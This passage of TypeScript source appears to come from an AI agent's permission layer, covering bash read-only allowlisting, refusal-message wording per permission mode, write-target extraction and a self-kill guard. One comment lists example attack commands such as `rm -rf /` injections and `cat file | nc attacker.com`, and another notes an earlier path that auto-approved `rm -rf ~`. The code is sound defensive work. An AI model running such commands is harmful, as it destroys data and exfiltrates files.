    lines.push(`To see what commands are allowed in ${resolveModeDisplayName(mode, config)} mode, read:`);
    lines.push(`  • ${config.permissionPaths.workspacePath}`);
    lines.push(`  • ${config.permissionPaths.appDefaultPath}`);
    lines.push('');
    lines.push('To understand the permission system and how to customize:');
    lines.push(`  • ${config.permissionPaths.docsPath}`);
  }

  return lines.join('\n');
}

/**
 * Detect known upstream bash-parser tokenizer bugs.
 *
 * bash-parser has longstanding edge cases around quoted `$` / `)` handling
 * that can throw internal errors like `reducers.doubleQuoting`.
 */
function isKnownBashParserTokenizerBug(error: string): boolean {
  const lower = error.toLowerCase();
  return lower.includes('doublequoting') || lower.includes('reducers.doublequoting');
}

/**
 * Agent-facing mode-switch hint: the retired Explore's escape, and Explore's alone since
 * P2.38. The mode names come from PERMISSION_MODE_AGENT_LABELS (pinned
 * byte-equal to the en locale by mode-label-source.test.ts) — never inline a
 * mode-name literal here or at a call site.
 *
 * It has exactly one caller — {@link formatModeBlockEscapeHint}'s fall-through,
 * reached by no mode that blocks since F1.1050 retired `explore`. Call THAT function,
 * never this one: a second call site here is how a `plan` or `dontAsk` session
 * gets handed a SHIFT+TAB cycle `permission-modes.md:132` says Unattended
 * "never appears in" — which is what the bash family did until P2.38.
 */
function formatModeSwitchHint(shortcutHint: string): string {
  return `Switch to ${PERMISSION_MODE_AGENT_LABELS.default} or ${PERMISSION_MODE_AGENT_LABELS.bypassPermissions} mode (${shortcutHint})`;
}

/**
 * The blocking mode's OWN agent-facing name.
 *
 * `ModeConfig.displayName` was `SAFE_MODE_CONFIG`'s `'Explore'` on every path (`'Plan'` since F1.1170) —
 * it is both the no-`permissionsContext` fallback here and the base
 * `buildMergedConfig` copies `displayName`/`shortcutHint` from — so a message
 * built from `config` alone told a Plan-mode user their writes were blocked
 * "in Explore". The mode is the source; the config is only the fallback for a
 * mode outside the table.
 */
function resolveModeDisplayName(mode: PermissionMode, config: ToolCheckConfig): string {
  return PERMISSION_MODE_AGENT_LABELS[mode] ?? config.displayName;
}

/**
 * The escape hint for the mode that BLOCKED the call — the second half of the
 * same message, and wrong for the same reason before P2.32.
 *
 * Only `dontAsk` and `plan` reach a block here (F1.1050 retired `explore`):
 * `bypassPermissions` and the interactive write modes are admitted above.
 * Neither leaves the block the way the retired Explore did:
 *
 * - `plan` — permission-modes.md:238 "edits stay blocked until you approve the
 *   plan", and :248 "Press `Shift+Tab` again to leave plan mode without
 *   approving a plan". Approving is the intended exit, so it leads.
 * - `dontAsk` — permission-modes.md:132 "`dontAsk`: never appears in the
 *   cycle", so the shortcut is not its way out at all; :474 names what it does
 *   admit, "actions matching your `permissions.allow` rules". The shortcut is
 *   deliberately omitted rather than offered.
 *
 * Every refusal `plan` or `dontAsk` can produce routes through this except ONE
 * carve-out: `dontAsk`'s browser/WebFetch refusal keeps its own "An explicit
 * allow rule can pre-approve it." sentence (F1.1228's boundary test pins it).
 * The rest — the blocked-tool branch (via `getBlockReasonWithConfig`), the five
 * siblings in `shouldAllowToolInMode` (browser, session-config, API-via-MCP,
 * MCP write, API), and — since P2.38 — the whole bash family:
 * `formatBashRejectionMessage`'s thirteen sentences and the missing-command
 * message beside it. It shipped keyed on the mode but wired to one of those
 * callers — one Unattended session read two ways out, one function apart.
 *
 * TWO wordings are deliberately NOT here, and the qualifier above is why: the
 * plans/data write-target refusals (the `Bash` write-target block and the
 * `Write`/`Edit` one) ended in "Or ask the user to switch to Manual or Auto mode".
 * Both sat behind `allowsPlanAndDataWrites`, which was `mode === 'explore'`, and
 * F1.1050 deleted both with the retired mode — neither was ever reachable in
 * `plan` or `dontAsk`. Should a write-target refusal return, measure that gate
 * again before folding it in; do not add a THIRD such wording.
 *
 * Two test files pin this, and between them they cover every branch a mode can
 * reach: `__tests__/mode-block-reason.test.ts` asserts the eight non-bash escapes
 * as a SET per mode, and `tests/mode-manager.test.ts` ("one escape hint per
 * refusal") does the same for the bash family — including that a refusal carries
 * exactly ONE, which is the shape a second wording breaks.
 *
 * The bash family was held back by P2.32 on the reasoning that it "never named a
 * mode at all, so it never named the wrong one". True of the mode NAME and
 * beside the point for the escape: measured on P2.38's parent, one `dontAsk`
 * session was offered THREE different ways out — this function's allow rule for
 * a blocked write, `formatModeSwitchHint`'s SHIFT+TAB for a blocked command, and
 * a third "switch to Manual mode" for a `dangerous_operator`. Naming no mode is
 * not the same as pointing at the right exit.
 *
 * Two consequences of being shared by every refusal sentence:
 *
 * - the hint must not agree with a subject. It follows "File modifications
 *   are…", "MCP write operations are…" and "NotebookEdit is…" alike, so it
 *   names the CALL rather than referring back with "it".
 * - it is the AGENT channel, so it must be something the reader can act on.
 *   The model cannot approve a plan or press a shortcut; in plan mode it can
 *   call SubmitPlan and can ask the user, which is what this file's own plan
 *   guidance says to do (`formatModeGuidance`, `plan`: "The deliverable is the
 *   plan itself — call SubmitPlan when it is ready to proceed"). Unattended
 *   cannot even ask — same guidance, `dontAsk`: "asking the user is not
 *   available" — so its hint stays impersonal and states what admits the call.
 *
 * Mode names come from PERMISSION_MODE_AGENT_LABELS, never from a literal.
 */
function formatModeBlockEscapeHint(mode: PermissionMode, shortcutHint: string): string {
  if (mode === 'plan') {
    return `Call SubmitPlan and let the user approve the plan, or ask them to leave ${PERMISSION_MODE_AGENT_LABELS.plan} mode (${shortcutHint})`;
  }
  if (mode === 'dontAsk') {
    return `This call needs an explicit allow rule, or a switch to ${PERMISSION_MODE_AGENT_LABELS.default} or ${PERMISSION_MODE_AGENT_LABELS.bypassPermissions} mode`;
  }
  return formatModeSwitchHint(shortcutHint);
}

/**
 * Format a bash rejection reason into a user-friendly error message.
 * The message explains what was blocked and why, helping the agent understand the issue.
 * Includes actionable guidance on how to customize permissions.
 *
 * ## ONE ESCAPE PER MODE, AND THIS FAMILY USED TO HOLD TWO (P2.38)
 *
 * `mode` is required, not decoration — the same rule
 * {@link getBlockReasonWithConfig} carries, and this family is the half P2.32
 * deliberately left out because it named no mode at all. Naming none is not the
 * same as naming none WRONG, but it still offered the wrong way OUT: every
 * sentence below reached for `formatModeSwitchHint`, which was Explore's escape,
 * and one of them reached for a third wording of its own. Measured on the parent
 * commit over eleven refusals of one session, counting DISTINCT escape hints:
 *
 *   dontAsk 3 — "Switch to Manual or Bypass permissions mode (SHIFT+TAB)" on the
 *               bash refusals, "switch to Manual mode" on the two
 *               `dangerous_operator` ones, and the mode's real escape ("This call
 *               needs an explicit allow rule…") on everything else.
 *   plan    3 — the same two here, against "Call SubmitPlan…" everywhere else.
 *   explore 2 — the two bash wordings; explore is the one mode where both are
 *               at least pointing at the right modes.
 *
 * A FOURTH wording was found while finishing this row and is counted here
 * because it is the only one that put two escapes in a SINGLE message:
 * `generateMismatchSuggestion` ended its flags-before-subcommand sentence with
 * "or switch to Manual/Bypass permissions mode", and that sentence is embedded
 * in the `no_safe_pattern` message. Measured on the parent, one `plan` refusal
 * of `git -v` read that AND "Call SubmitPlan…" eleven lines below it; one
 * `dontAsk` refusal read it AND "This call needs an explicit allow rule…". That
 * function runs at rejection-BUILD time and never sees a mode, so the clause was
 * dropped rather than threaded — see the comment there.
 *
 * After: 1 in every mode, and 1 per message. The escape is
 * {@link formatModeBlockEscapeHint}'s, so a `dontAsk` session is pointed at an
 * allow rule and a `plan` session at SubmitPlan — including for a blocked shell
 * command, which is the refusal a session in either mode is most likely to meet
 * first.
 */
export function formatBashRejectionMessage(
  reason: BashRejectionReason,
  config: ToolCheckConfig,
  mode: PermissionMode,
): string {
  const modeEscapeHint = `${formatModeBlockEscapeHint(mode, config.shortcutHint)} to run it.`;
  const permissionGuidance = formatPermissionGuidance(config, mode);

  switch (reason.type) {
    case 'control_char':
      return `Bash command blocked: contains "${reason.char}" character. ${reason.explanation}. ${modeEscapeHint}`;

    case 'no_safe_pattern': {
      // Build a helpful message showing what patterns might be relevant
      const lines: string[] = [];
      lines.push(`Bash command \`${reason.command}\` is not in the read-only allowlist.`);

      // Prefer deterministic per-command guidance over fuzzy regex diagnostics.
      if (reason.commandHint) {
        lines.push('');
        lines.push(`Why: ${reason.commandHint.reason}`);
        if (reason.commandHint.context) {
          lines.push(`Context: ${reason.commandHint.context}`);
        }
        if (reason.commandHint.tryInstead && reason.commandHint.tryInstead.length > 0) {
          lines.push('Try instead:');
          for (const item of reason.commandHint.tryInstead) {
            lines.push(`  • ${item}`);
          }
        }
        if (reason.commandHint.example) {
          lines.push(`Example: \`${reason.commandHint.example}\``);
        }
      }

      // If we have mismatch analysis, show detailed diagnostics as heuristic guidance.
      if (reason.mismatchAnalysis) {
        const analysis = reason.mismatchAnalysis;
        lines.push('');

        // Show what matched and where it failed
        if (analysis.matchedPrefix) {
          lines.push(`Matched: \`${analysis.matchedPrefix}\` (${analysis.failedAtPosition} chars)`);
        }
        if (analysis.failedToken) {
          lines.push(`Failed at: \`${analysis.failedToken}\` (position ${analysis.failedAtPosition})`);
        }

        // Show the actionable suggestion if we have one
        if (analysis.suggestion) {
          lines.push('');
          lines.push(analysis.suggestion);
        }

        // Show which pattern was closest to matching (heuristic only)
        if (analysis.bestMatchPattern?.comment) {
          lines.push('');
          lines.push(`Closest allowlist hint (heuristic): ${analysis.bestMatchPattern.comment}`);
        }
      } else if (reason.relevantPatterns.length > 0) {
        // Fall back to showing relevant patterns if no mismatch analysis
        lines.push('');
        lines.push('Heuristic relevant pattern(s):');
        for (const pattern of reason.relevantPatterns) {
          // Show the pattern regex (simplified for readability)
          const patternDisplay = pattern.source.length > 80
            ? pattern.source.substring(0, 77) + '...'
            : pattern.source;
          lines.push(`  Pattern: \`${patternDisplay}\``);
          if (pattern.comment) {
            lines.push(`  → ${pattern.comment}`);
          }
        }
        lines.push('');
        lines.push('The command must match an allowlist pattern exactly from the start.');
      }

      // Add permission guidance for pattern-based rejections
      lines.push(permissionGuidance);
      lines.push('');
      lines.push(modeEscapeHint);
      return lines.join('\n');
    }

    case 'dangerous_operator': {
      // The one sentence in this family that had an escape of its own — "switch
      // to Manual mode", naming ONE mode where every sibling names two and
      // offering it to `plan` and `dontAsk` alike. It also handed the reader
      // "Run commands separately" for a REDIRECT (`echo hi > /tmp/x`), where
      // there is no second command to separate; that half is kept only for the
      // `chain` operators it is actually about.
      const separateCommands = reason.operatorType === 'chain' ? 'Run commands separately. ' : '';
      return `Bash command blocked: contains "${reason.operator}" operator. This ${reason.explanation}. ${separateCommands}${modeEscapeHint}`;
    }

    case 'dangerous_substitution':
      return `Bash command blocked: contains ${reason.pattern} syntax. ${reason.explanation}. ${modeEscapeHint}`;

    case 'parse_error': {
      const lines: string[] = [];
      lines.push(`Bash command blocked: could not parse command safely (${reason.error}).`);

      if (isKnownBashParserTokenizerBug(reason.error)) {
        lines.push('');
        lines.push('This looks like a known bash-parser tokenizer bug (not necessarily unsafe intent).');
        lines.push('Try using single quotes for regex/text arguments instead of double quotes.');
        lines.push('Problematic patterns often involve `$` (and sometimes `)`) inside double-quoted strings.');
        lines.push('Example: `rg -n "a|b|$|c" ...` → `rg -n \'a|b|$|c\' ...`');
      }

      lines.push('');
      lines.push(modeEscapeHint);
      return lines.join('\n');
    }

    case 'compound_partial_fail': {
      // Some commands in a compound expression failed
      const lines: string[] = [];
      lines.push('Bash command blocked: compound command contains unsafe operations.');
      lines.push('');
      if (reason.passedCommands.length > 0) {
        lines.push('✓ Allowed commands:');
        for (const cmd of reason.passedCommands) {
          lines.push(`  • \`${cmd}\``);
        }
      }
      if (reason.failedCommands.length > 0) {
        lines.push('✗ Blocked commands (not in read-only allowlist):');
        for (const cmd of reason.failedCommands) {
          lines.push(`  • \`${cmd}\``);
        }
      }
      // Add permission guidance for compound command failures
      lines.push(permissionGuidance);
      lines.push('');
      lines.push(modeEscapeHint);
      return lines.join('\n');
    }

    // New AST-based types (shouldn't reach here as they're converted above, but handle for completeness)
    case 'pipeline':
      return `Bash command blocked: contains pipeline (|). ${reason.explanation}. ${modeEscapeHint}`;

    case 'redirect':
      return `Bash command blocked: contains "${reason.op}" redirect. This ${reason.explanation}. ${modeEscapeHint}`;

    case 'command_expansion':
      return `Bash command blocked: contains command substitution. ${reason.explanation}. ${modeEscapeHint}`;

    case 'process_substitution':
      return `Bash command blocked: contains process substitution. ${reason.explanation}. ${modeEscapeHint}`;

    case 'parameter_expansion':
      return `Bash command blocked: contains variable expansion (\${} / $VAR). ${reason.explanation}. ${modeEscapeHint}`;

    case 'env_assignment':
      return `Bash command blocked: contains environment variable assignment. ${reason.explanation}. ${modeEscapeHint}`;

    case 'unsafe_command': {
      const lines: string[] = [];
      lines.push(`Bash command blocked: \`${reason.command}\` is not in the read-only allowlist.`);
      lines.push(permissionGuidance);
      lines.push('');
      lines.push(modeEscapeHint);
      return lines.join('\n');
    }
  }
}

/**
 * Check if a Bash command is read-only using the given config.
 *
 * Uses AST-based validation to properly handle compound commands like
 * `git status && git log` - each part is validated separately, and the
 * command is allowed only if ALL parts pass.
 *
 * A command is considered safe if:
 * 1. It does NOT contain dangerous control characters (newlines, etc.)
 * 2. All simple commands match read-only patterns (including in compound commands)
 * 3. It does NOT contain redirects (>, >>, <) - these modify files
 * 4. It does NOT contain command/process substitution ($(), ``, <(), >())
 * 5. It does NOT run in background (&)
 *
 * Compound commands (&&, ||, |) are allowed when ALL parts are safe:
 * - `git status && git log` is allowed (both commands are safe)
 * - `git log | head` is allowed (both commands are safe)
 *
 * This multi-step check prevents attacks like:
 * - `ls\nrm -rf /` (newline injection)
 * - `git status && rm -rf /` (dangerous command in chain - rm not in allowlist)
 * - `cat file | nc attacker.com` (nc not in allowlist)
 * - `ls $(rm -rf /)` (command substitution)
 */
/**
 * Check if a Bash command is read-only using a custom config.
 * Exported for testing purposes.
 *
 * @param command - The bash command to check
 * @param config - Tool check configuration with patterns
 * @returns true if command is safe to run in read-only mode
 */
export function isReadOnlyBashCommandWithConfig(command: string, config: ToolCheckConfig): boolean {
  // Use getBashRejectionReason which now uses AST-based validation
  // If no rejection reason, command is safe
  const rejection = getBashRejectionReason(command, config);
  return rejection === null;
}

/**
 * Check if a Bash command is read-only using the default safe mode config.
 * Exported for testing.
 *
 * @param command - The bash command to check
 * @returns true if command is safe to run in read-only mode
 */
export function isReadOnlyBashCommand(command: string): boolean {
  return isReadOnlyBashCommandWithConfig(command, SAFE_MODE_CONFIG);
}

/**
 * Extract the write target path from a bash command.
 * Returns the file path if the command writes to a file via redirect, null otherwise.
 *
 * Handles:
 * - Direct redirects: `echo "x" > /path/file`
 * - Codex subshell pattern: `/bin/zsh -lc "cat <<'EOF' > /path/file\n...\nEOF"`
 * - sh/bash -c variants: `bash -c "echo x > /path/file"`
 * - PowerShell Out-File: `@(...) | Out-File -FilePath 'path'`
 * - PowerShell Set-Content/Add-Content: `'...' | Set-Content -Path 'path'`
 */
export function extractBashWriteTarget(command: string): string | null {
  // Pattern 1: Quoted path after redirect (handles Codex's escaped quotes)
  // Matches: > "/path/to/file" or > \"/path/to/file\"
  const quotedPathMatch = command.match(/>\s*\\?"([^"]+)"/);
  if (quotedPathMatch?.[1] && quotedPathMatch[1] !== '/dev/null') {
    return quotedPathMatch[1];
  }

  // Pattern 2: shell -c/-lc with inner redirect (Codex pattern, unquoted paths)
  // Match: /bin/zsh -lc "... > /path/to/file ..." or bash -c '... > /path ...'
  const shellExecMatch = command.match(
    /(?:\/bin\/)?(?:zsh|bash|sh)\s+(?:-\w+\s+)*["'].*?>\s*([^\s'"\\]+)/
  );
  if (shellExecMatch?.[1] && shellExecMatch[1] !== '/dev/null') {
    return shellExecMatch[1];
  }

  // Pattern 3: Direct redirect - extract path after > or >>
  // Guard against non-shell uses like JavaScript arrow functions (=>).
  const directRedirectMatch = command.match(/(?:^|[^=<>])>{1,2}\s*([^\s;|&"'>=][^\s;|&"'>]*)/);
  if (directRedirectMatch?.[1] && directRedirectMatch[1] !== '/dev/null') {
    return directRedirectMatch[1];
  }

  // Pattern 4: PowerShell Out-File with -FilePath or -Path parameter
  // Matches: | Out-File -FilePath 'path' or | Out-File -Path "path"
  const outFileParamMatch = command.match(/Out-File\s+-(?:File)?Path\s+['"]([^'"]+)['"]/i);
  if (outFileParamMatch?.[1]) {
    return outFileParamMatch[1];
  }

  // Pattern 5: PowerShell Out-File with positional path (no -FilePath flag)
  // Matches: | Out-File 'path' or | Out-File "path"
  // Must not match -FilePath or -Encoding etc.
  const outFilePosMatch = command.match(/Out-File\s+['"]([^'"]+)['"]/i);
  if (outFilePosMatch?.[1] && !command.match(/Out-File\s+-\w/i)) {
    return outFilePosMatch[1];
  }

  // Pattern 6: PowerShell Set-Content or Add-Content with -Path parameter
  // Matches: | Set-Content -Path 'path' or | Add-Content -Path "path"
  const setContentMatch = command.match(/(?:Set|Add)-Content\s+-Path\s+['"]([^'"]+)['"]/i);
  if (setContentMatch?.[1]) {
    return setContentMatch[1];
  }

  // Pattern 7: PowerShell Set-Content/Add-Content with escaped quotes (inside powershell.exe -Command "...")
  // When Codex wraps PS commands: powershell.exe -Command "Set-Content -Path \"C:\path\file\" -Value ..."
  // The -Path value uses escaped quotes \" which don't match Pattern 6's ['"] anchors.
  // This is a REQUIRED fallback: in the Codex agent context, PowerShell AST parsing
  // may be unavailable (isPowerShellAvailable() returns false), so extractPowerShellWriteTarget()
  // returns null and this regex is the only path extraction mechanism.
  const setContentEscapedMatch = command.match(/(?:Set|Add)-Content\s+-Path\s+\\"([^"]+)\\"/i);
  if (setContentEscapedMatch?.[1]) {
    return setContentEscapedMatch[1];
  }

  // Pattern 8: PowerShell Out-File with escaped quotes (same wrapper scenario)
  const outFileEscapedMatch = command.match(/Out-File\s+-(?:File)?Path\s+\\"([^"]+)\\"/i);
  if (outFileEscapedMatch?.[1]) {
    return outFileEscapedMatch[1];
  }

  return null;
}

/**
 * Check if a command looks like it might be trying to write files.
 * Used to provide better error messages when write detection fails.
 */
export function looksLikePotentialWrite(command: string): boolean {
  // Shell redirects at token boundaries (avoid matching JS arrows like =>)
  const hasRedirectToken = /(?:^|[\s;|&()])\d*>>?(?![=>])/.test(command);
  // Common PowerShell write cmdlets
  const hasPowerShellWriteCmdlet = /(?:Out-File|Set-Content|Add-Content)\b/i.test(command);
  return hasRedirectToken || hasPowerShellWriteCmdlet;
}

/**
 * A hint naming the session's folders for a blocked write. F1.547: the session root is `dirname(dataFolderPath)` —
 * `<sessionDir>/data` at every producer, as F1.536's `sessionScratchTmpDir` reads it — since `plansDirectory` moves the plans folder.
 */
export function getPathHint(targetPath: string, plansFolderPath: string, dataFolderPath?: string): string | null {
  const sessionRootPath = dirname(dataFolderPath ?? plansFolderPath); // no data folder (a legacy caller): the old plans-derived reading
  const workspaceRootPath = dirname(dirname(sessionRootPath));
  const sessionsRootPath = dirname(sessionRootPath);
  const targetInWorkspace = isPathWithin(workspaceRootPath, targetPath);
  const targetInSession = isPathWithin(sessionRootPath, targetPath);
  const targetInPlans = isPathWithin(plansFolderPath, targetPath);
  const targetInData = !!dataFolderPath && isPathWithin(dataFolderPath, targetPath);

  // Case: Writing to session folder but missing /plans/ or /data/
  if (targetInSession && !targetInPlans && !targetInData) {
    return isPathWithin(sessionRootPath, plansFolderPath) ? 'Hint: Write to the /plans/ or /data/ subfolder, not the session folder directly.' : 'Hint: Write to the plans folder (plansFolderPath) or the /data/ subfolder, not the session folder directly.';
  }

  // Case: Writing to the active workspace root instead of its current session.
  // The session paths are trusted session context; never infer a workspace from a global suffix.
  if (targetInWorkspace && !targetInSession) {
    if (isPathWithin(sessionsRootPath, targetPath)) {
      const targetSessionId = relative(sessionsRootPath, resolve(targetPath)).split(/[\\/]/)[0];
      const activeSessionId = relative(sessionsRootPath, resolve(sessionRootPath)).split(/[\\/]/)[0];
      if (targetSessionId && activeSessionId && targetSessionId !== activeSessionId) {
        return `Hint: Wrong session ID. Current session is "${activeSessionId}".`;
      }
    }
    return 'Hint: Write to the session plans or data folder, not the workspace root.';
  }

  // Case: Writing outside the active workspace entirely.
  if (!targetInWorkspace) {
    return 'Hint: Files must be written to the session plans or data folder. Use plansFolderPath or dataFolderPath from <session_state>.';
  }

  return null;
}

/**
 * Check if an MCP tool is read-only using the given config
 */
function isReadOnlyMcpToolWithConfig(toolName: string, config: ToolCheckConfig): boolean {
  return !mcpToolCarriesWriteToken(toolName) && config.readOnlyMcpPatterns.some(pattern => pattern.test(toolName));
}

/**
 * Check if an API call is allowed using the given config
 * Checks fine-grained endpoint rules (method + path pattern)
 */
function isApiCallAllowedWithConfig(method: string, path: string | undefined, config: ToolCheckConfig, toolName?: string): boolean {
  const upperMethod = method.toUpperCase();

  // GET is always allowed
  if (upperMethod === 'GET') return true;

  // Check fine-grained endpoint rules (if path is available)
  if (path && config.allowedApiEndpoints) {
    for (const rule of config.allowedApiEndpoints) {
      if (rule.method === upperMethod && rule.pathPattern.test(path) && apiEndpointRuleGrantsTool(rule, toolName)) { // F1.1152
        return true;
      }
    }
  }

  return false;
}

/**
 * Check if an API endpoint is allowed based on permissions context.
 * Used in the manual mode to auto-allow whitelisted API endpoints from permissions.json.
 *
 * @param method - HTTP method (GET, POST, etc.)
 * @param path - API endpoint path
 * @param permissionsContext - Context for loading custom permissions
 * @returns true if endpoint is allowed (GET or matches allowedApiEndpoints rules)
 */
export function isApiEndpointAllowed(
  method: string,
  path: string | undefined,
  permissionsContext?: PermissionsContext, toolName?: string, // F1.1152: a source's own rule grants only its api_<slug> tool
): boolean {
  let config: ToolCheckConfig;

  if (permissionsContext) {
    // Lazy import to avoid circular dependency
    const { permissionsConfigCache } = require('./permissions-config.ts');
    config = permissionsConfigCache.getMergedConfig(permissionsContext);
  } else {
    config = SAFE_MODE_CONFIG;
  }

  return isApiCallAllowedWithConfig(method, path, config, toolName);
}

/**
 * Tools that are always allowed in any mode (read-only by nature).
 *
 * Exported READ-ONLY for one reason, and it is not convenience (P2.220): this
 * set is a THIRD contributor to a session tool's read-only-allowlist verdict, and it is the
 * one that can OUTRANK the other two. `shouldAllowToolInMode` consults it —
 * both exactly and by an `__<name>` suffix match, so every `mcp__session__`
 * spelling of a name in here is covered — BEFORE it reaches the
 * `mcp__session__` branch that reads `safeMode`. So a name added here grants a
 * session tool that `session-tools-core` classifies `safeMode: 'block'`, and
 * nothing in that package would change.
 *
 * `session-tool-safe-mode-permissions.test.ts` asserts over the whole registry
 * with this set as an explicit term, so that override is a named, visible list
 * rather than an emergent one.
 */
export const ALWAYS_ALLOWED_TOOLS: ReadonlySet<string> = new Set(ALWAYS_ALLOWED_TOOL_NAMES);
// The NAMES live in `always-allowed-tools.ts`, a leaf with no imports, and
// this is still the only Set — P3.351 needed the same list in the renderer, and
// this file reaches 193 node-builtin import edges over 274 files. Nothing about
// this constant's contract changed; add a name in the leaf.

/** Render a browser_tool input's command for prompt/deny text (array form joined). */
function describeBrowserToolCommand(toolInput: unknown): string {
  const command = toolInput && typeof toolInput === 'object'
    ? (toolInput as { command?: unknown }).command
    : undefined;
  if (Array.isArray(command)) return command.map(part => String(part)).join(' ');
  if (typeof command === 'string') return command.trim();
  return '(missing command)';
}

/**
 * Result type for tool permission checks
 */
export type ToolCheckResult =
  | { allowed: true; requiresPermission?: false }
  | {
      allowed: true;
      requiresPermission: true;
      description: string;
      /**
       * PLAN mode met a shell command outside the read-only set — the band the
       * page describes with "the classifier reviews shell commands during
       * planning instead of prompting you". The sentence is the anchor and the
       * number a convenience: `permission-modes.md:240` on the 2026-08-23 fetch
       * (the `:156` cited here before is a VS Code UI-label table row there).
       * Distinct from an explicit `ask` rule, which
       * is a NON-NEGOTIABLE prompt: this one is the classifier's band, so the
       * gate may route it to the judge before asking a human. Every floor above
       * — deny paths, deny/ask rules, the removal circuit breaker — has already
       * returned by the time this is set, so it can never soften one.
       */
      planShellReview?: true;
    }
  | {
      allowed: false;
      reason: string;
      denyPathBlocked?: boolean;
      /** The denial is a `dontAsk` ask-rule resolution — an R15 band non-negotiable. */
      askRuleDenied?: boolean;
    };

/**
 * `pkill` options that consume the NEXT token as their value, so that token is
 * not the pattern. Without this list `pkill -u node` would be read as the
 * pattern `node`, which matches our own interpreter's name and would refuse a
 * command that kills nobody of ours — a floor that cries wolf is a floor people
 * turn off. (`-d` is pgrep's delimiter; harmless to carry.)
 */
const PKILL_VALUE_OPTIONS = new Set(['u', 'U', 'g', 'G', 'P', 's', 't', 'd']);

/** Split one `pkill` argument tail into tokens, dropping one layer of quoting. */
function tokenizePkillArgs(tail: string): string[] {
  const tokens = tail.match(/"[^"]*"|'[^']*'|[^\s]+/g) ?? [];
  return tokens.map(token =>
    (token.startsWith('"') && token.endsWith('"')) || (token.startsWith("'") && token.endsWith("'"))
      ? token.slice(1, -1)
      : token
  );
}

/**
 * A `pkill` whose pattern matches THIS process ends the session mid-turn (P6.212,
 * denominator A48). Refused before it runs, in every mode, because it is a
 * self-destruct guard and not a permission question — which is why the call site
 * sits above `shouldAllowToolInMode`'s `bypassPermissions` early return, beside
 * `getDeniedPathViolation`, the other mode-independent floor.
 *
 * **No subprocess.** The pattern is matched against our own identity rather than
 * against a live pid set from `pgrep`: `pkill <pat>` matches the process NAME, so
 * the pattern is tested against `basename(process.execPath)` and `process.argv0`;
 * `pkill -f <pat>` matches the full argv, so it is tested against
 * `process.argv.join(' ')`. Deterministic, race-free, and the row's control (an
 * unrelated `pkill` still runs) falls out of it for free.
 *
 * **Platform decision, stated rather than queued** (owner rule 2026-08-28,
 * "where the documentation is silent: transparent and simple"): upstream scopes
 * its own check to Linux; this product is desktop-first on macOS, where the
 * failure mode is identical, so the guard applies on EVERY POSIX platform.
 * Windows has no `pkill`, so it is skipped there rather than guessed at.
 *
 * **Residue, deliberately not covered:** `kill -9 <pid>`, `killall`, and anything
 * that resolves our pid through a shell substitution. Each needs the live pid set
 * this guard exists to avoid reading; the narrow form is the finishable one.
 */
export function getSelfTerminatingKillPattern(command: string): { pattern: string; matched: string } | null {
  if (process.platform === 'win32') {
    return null;
  }
  const invocations = command.matchAll(/(?:^|[;&|(`]|\$\()\s*(?:[^\s;&|()]*\/)?pkill\b([^;&|)\n]*)/g);
  for (const invocation of invocations) {
    const tokens = tokenizePkillArgs(invocation[1] ?? '');
    let matchFullArgv = false;
    let pattern: string | undefined;
    for (let index = 0; index < tokens.length; index += 1) {
      const token = tokens[index]!;
      if (token === '--') {
        pattern = tokens[index + 1];
        break;
      }
      if (token.startsWith('--')) {
        if (token === '--full') matchFullArgv = true;
        continue;
      }
      if (token.startsWith('-') && token.length > 1) {
        const flags = token.slice(1);
        if (flags.includes('f')) matchFullArgv = true;
        const last = flags[flags.length - 1]!;
        // A value-taking option with no attached value eats the next token.
        if (PKILL_VALUE_OPTIONS.has(last) && flags.length === 1) index += 1;
        continue;
      }
      pattern = token;
      break;
    }
    if (!pattern) {
      continue;
    }
    let expression: RegExp;
    try {
      // `pkill`'s pattern is an ERE, and an unparseable one is the shell's
      // problem, not ours: fail OPEN on a pattern we cannot read rather than
      // refuse a command on a guess.
      expression = new RegExp(pattern);
    } catch {
      continue;
    }
    const selfName = process.execPath.split(/[\\/]/).pop() ?? '';
    const subjects = matchFullArgv
      ? [process.argv.join(' ')]
      : [selfName, process.argv0 ?? ''];
    for (const subject of subjects) {
      if (subject && expression.test(subject)) {
        return { pattern, matched: subject };
      }
    }
  }
  return null;
}

/**
 * Centralized check: should a tool be allowed based on permission mode?
 *
 * ## THE HOST GATE MAY ONLY TIGHTEN (P2.123)
 *
 * Written here because this is where it is enforced rather than only where it is
 * described. Everything this layer and the pipeline above it can do to a tool
 * call is one of two things: block it (DENY) or demand a person answer for it
 * (ASK). Neither this function, nor a hook, nor a rule may take a call the
 * runtime would have asked about and make it not-asked over a floor — the policy
 * layer never silences the user's own consent. And a verdict this layer cannot
 * obtain fails CLOSED: an unparseable policy document answers `deny`
 * (`pi-harness/permission-dsl.ts`), a stale generation answers `deny`, and a
 * floor that cannot be evaluated leaves the prompt standing.
 *
 * The rule has a structural half and a behavioural half, and the structural half
 * is the one that survives an edit: {@link findNonNegotiableFloors} in
 * `core/pre-tool-use.ts` has NO return value that authorizes a call — every
 * branch yields a match or `null` — so consulting a floor can only ever cost an
 * approval and never buy one. The behavioural half is the asymmetry each answer
 * path spells out at its own site: a rule `deny` needs no permission check
 * because refusing is never a widening, while a rule `allow` is checked against
 * the mode AND the floors first (`pi-agent.ts`'s answer path; `codex-agent.ts`'s
 * `consultPermissionRules`).
 *
 * CODEX WAS A LIVE VIOLATION OF THIS UNTIL P2.140, and the violation is worth
 * keeping written down because it was invisible from here: codex adjudicates
 * through an app-server approval request rather than a tool call, so it never
 * called `runPreToolUseChecks` at all (`grep -ac 'runPreToolUseChecks('` →
 * codex 0, pi 6, claude 1, measured 2026-08-25). On that path our layer could
 * neither tighten NOR be asked — an ordinary `allow: ['Bash(rm:*)']` rule
 * auto-approved `rm -rf ~` with no card, measured on the production path. It now
 * calls the same floor evaluator this rule is about.
 *
 * This is the single source of truth for tool permissions.
 * Returns different results based on the permission mode:
 * - 'dontAsk': Never prompt; run what the rules pre-approve, deny the rest
 * - (F1.1050: the retired 'explore' reaches here only as 'plan', via parsePermissionMode)
 * - 'plan': Block writes (no prompting) except its .md plan and the session data folder; SubmitPlan allowed
 * - 'default': Allow but may require permission for dangerous operations
 * - 'acceptEdits': Allow file writes without prompting, prompt for other mutations
 * - 'auto': Allow low-risk actions without prompting, prompt for risky mutations
 * - 'bypassPermissions': Allow everything
 */
export function shouldAllowToolInMode(
  toolName: string,
  toolInput: unknown,
  mode: PermissionMode,
  options?: {
    plansFolderPath?: string;
    dataFolderPath?: string;
    additionalDirectories?: string[];
    /**
     * P6.202 — the session's primary working directory, the base the read fence
     * measures containment against. Absent means the caller cannot say, and the
     * fence then declines to answer rather than inventing a base; see
     * {@link getReadsOutsideWorkingDirectoriesViolation}.
     */
